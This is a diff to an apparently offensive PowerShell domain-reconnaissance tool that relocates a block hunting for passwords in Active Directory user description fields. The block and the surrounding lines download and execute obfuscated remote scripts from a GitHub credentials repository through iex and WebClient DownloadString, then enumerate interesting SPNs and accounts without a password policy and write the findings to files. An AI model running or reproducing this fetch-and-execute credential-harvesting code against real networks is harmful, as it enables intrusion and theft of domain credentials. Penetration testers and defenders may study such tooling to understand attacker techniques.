@@ -2121,6 +2121,16 @@ function generaldomaininfo{
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     
+     #Search for AD-Passwords in description fields
+    Write-Host -ForegroundColor Yellow '------->  Searching for passwords in active directory description fields..'
+    
+    iex ($admodule)            
+    
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/adpass.ps1')
+
+    if(!$consoleoutput){thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"}else{Write-Host -ForegroundColor Yellow '------->  Passwords in description fields:';thyme}
+
+    
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
     $domain_Name = skulked
     $Domain = $domain_Name.Name
@@ -2209,15 +2219,6 @@ function generaldomaininfo{
   if(!$consoleoutput){Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"}else{Write-Host -ForegroundColor Yellow "------->  InterestingSPNs";Discover-PSInterestingServices}
     
 	    
-    #Search for AD-Passwords in description fields
-    Write-Host -ForegroundColor Yellow '------->  Searching for passwords in active directory description fields..'
-    
-    iex ($admodule)            
-    
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/adpass.ps1')
-
-    if(!$consoleoutput){thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"}else{Write-Host -ForegroundColor Yellow '------->  Passwords in description fields:';thyme}
-
     if(!$consoleoutput){Get-ADUser -Filter {UserAccountControl -band 0x0020} >> "$currentPath\Vulnerabilities\UsersWithoutPasswordPolicy.txt"}else{Write-Host -ForegroundColor Yellow '------->  Users without password policy:';Get-ADUser -Filter {UserAccountControl -band 0x0020}}
 
 # Dictionary to hold superclass names
